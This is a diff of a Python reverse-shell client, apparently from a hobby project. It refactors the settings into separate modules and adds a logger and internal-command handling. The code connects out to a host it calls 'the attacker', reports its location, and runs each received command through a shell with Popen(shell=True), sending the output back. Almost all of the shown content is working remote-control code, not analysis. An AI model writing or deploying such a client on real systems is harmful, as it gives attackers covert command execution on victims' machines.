@@ -14,17 +14,29 @@ import locale
 from subprocess import *
 
 import command
+import constant
+import logger
 
-
-HOST = '127.0.0.1'  # Symbolic name meaning all available interfaces
-PORT = 50007        # Arbitrary non-privileged port
-
-BUF_SIZE = 1024
-
-ENCODE_TYPE = 'utf-8'
-DECODE_TYPE = 'utf-8'
 
 DEFAULT_LOCALE = []
+
+def resolve_hp():
+    """Reolve host and port.
+    """
+    # Resolve arguments.
+    arg_len = len(sys.argv)
+
+    if 2 <= arg_len:
+        host = sys.argv[1]
+    else:
+        host = constant.HOST
+
+    if 3 <= arg_len:
+        port = int(sys.argv[2])
+    else:
+        port = constant.PORT
+
+    return (host, port)
 
 
 def main():
@@ -32,39 +44,37 @@ def main():
 
     DEFAULT_LOCALE = locale.getdefaultlocale()[1]
 
-    # Resolve arguments.
-    arg_len = len(sys.argv)
+    host, port = resolve_hp()
 
-    if 2 <= arg_len:
-        host = sys.argv[1]
-    else:
-        host = HOST
-
-    if 3 <= arg_len:
-        port = int(sys.argv[2])
-    else:
-        port = PORT
-
-    print("Connecting to the Reverse Shell server...")
+    logger.info("Connecting to the Reverse Shell server...")
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        print(f"Connecting to the attacker : {host}:{port}")
+        logger.info(f"Connecting to the attacker : {host}:{port}")
         s.connect((host, port))
 
         while True:
             # Send the path.
             path = os.path.dirname(os.path.abspath(__file__))
-            s.sendall(path.encode(ENCODE_TYPE))
+            s.sendall(path.encode(constant.ENCODE_TYPE))
 
             # Receive it.
-            data = s.recv(BUF_SIZE)
+            data = s.recv(constant.BUF_SIZE)
             if not data:
                 break
 
-            in_cmd = data.decode(DECODE_TYPE)
-            print("Received: ", str(data));
+            in_cmd = data.decode(constant.DECODE_TYPE)
+            data_str = str(data)
+            logger.info(f"Received: {data_str}");
 
-            if in_cmd == command.Command.SHUTDOWN.value:
-                break
+            # Check if is internal command type.
+            iic = command.is_internal_command(in_cmd)
+
+            if iic:
+                # Remove prefix, get the real command.
+                in_cmd = in_cmd[1:]
+                if in_cmd == command.Command.SHUTDOWN.value:
+                    break
+                else:
+                    print(f"'{in_cmd}' is not recognized internal command.")
 
             cd_path = in_cmd.split(" ")
 
@@ -80,7 +90,7 @@ def main():
             proc = Popen(in_cmd, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
             outs, errs = proc.communicate()
 
-            output = "** Default output command... **".encode(ENCODE_TYPE)
+            output = "** Default output command... **".encode(constant.ENCODE_TYPE)
 
             if outs:
                 output = outs
